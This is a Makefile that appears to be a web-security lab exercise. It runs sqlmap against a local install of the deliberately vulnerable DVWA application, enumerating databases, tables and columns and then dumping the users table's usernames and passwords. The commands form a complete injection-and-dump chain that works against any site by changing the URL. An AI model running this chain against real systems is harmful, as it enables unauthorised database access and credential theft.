URLBASE=http://localhost
#URLBASE="http://localhost/dvwa
PHPSESSID=lpmkv3jih7chc14mf9186bdni5
SQLMAP=sqlmap
#SQLMAP=./sqlmap.py


all:
	@echo "****************************************************"
	@echo "*** SEC-WEB: SQLMAP und DVWA                     ***"
	@echo "*** "
	@echo "****************************************************"
	@echo "make 1 -> *** install: SQLMAP und DVWA           ***"
	@echo "make 2 -> *** what type of database-server       ***"
	@echo "make 3 -> *** Find DB name                       ***"
	@echo "make 4 -> *** Find TABLES                        ***"
	@echo "make 5 -> *** Find COLUMN names                  ***"
	@echo "make 6 -> *** Find Username and password (dump)  ***"
	@echo "make 7 -> *** Links                              ***"
	@echo "****************************************************"

	
1:
	@echo "***********************"
	@echo "*** SQLMAP und DVWA ***"
	@echo "***********************"
	@echo "   1. install DVWA (http://www.dvwa.co.uk/) and SQLMAP (sqlmap.org)"
	@echo "   2. start dvwa with low seurity"
	@echo "   3. get PHPSESSID using firefox"
	@echo "      In developer-tools: Network->METHOD -> GET -> COOKIES: --cookie=security=low; PHPSESSID=muntlcq7ta765j205edd95hj13"
	@echo " " 
	@echo "   4. set MACRO PHPSESSID in this Makefile"

2:
	@echo "************************************"
	@echo "*** what type of database-server ***"
	@echo "************************************"
	$(SQLMAP) -u "$(URLBASE)/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=$(PHPSESSID)"

	
3:
	@echo "********************"
	@echo "*** Find DB name ***"
	@echo "********************"
	$(SQLMAP) -u "$(URLBASE)/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=$(PHPSESSID)" --dbs

4:
	@echo "********************"
	@echo "*** Find TABLES  ***"
	@echo "********************"
	$(SQLMAP) -u "$(URLBASE)/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=$(PHPSESSID)" -D dvwa --tables
	
5:
	@echo "**************************"
	@echo "*** Find COLUMN names  ***"
	@echo "**************************"
	$(SQLMAP) -u "$(URLBASE)/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=$(PHPSESSID)" -D dvwa -T users --columns
	
6:
	@echo "******************************************"
	@echo "*** Find Username and password (dump)  ***"
	@echo "******************************************"
	$(SQLMAP) -u "$(URLBASE)/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=$(PHPSESSID)" -D dvwa -T users -C user,password --dump
	

7:
	@echo "**************"
	@echo "*** Links  ***"
	@echo "**************"
	@echo "http://egodox.blogspot.co.at/2013/04/hack-website-using-sqlmap-sql-injection.html"
	@echo "http://hackonadime.blogspot.co.at/2011/07/sqlmap-introduction-sql-injection.html"
